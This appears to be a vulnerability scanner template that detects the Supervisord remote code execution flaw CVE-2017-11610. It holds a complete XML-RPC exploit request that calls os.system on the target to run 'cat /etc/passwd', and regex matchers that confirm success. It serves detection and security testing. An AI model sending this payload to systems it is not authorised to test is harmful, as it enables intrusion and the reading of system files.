id: CVE-2017-11610

info:
  name: CVE-2017-11610
  author: wooluo
  severity: high
  description: Supervisord 3.1.2 <= Version <= 3.3.2
  tags: cve,cve2017,rce
  reference:
    - https://blog.csdn.net/qq_37964989/article/details/89454076

requests:

  - raw:
      - |
        POST /RPC2 HTTP/1.1
        Host: {{BaseURL}}
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 275


        <?xml version="1.0"?>
        <methodCall>
        <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
        <params>
        <param>
        <string>cat /etc/passwd</string>
        </param>
        </params>
        </methodCall>

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
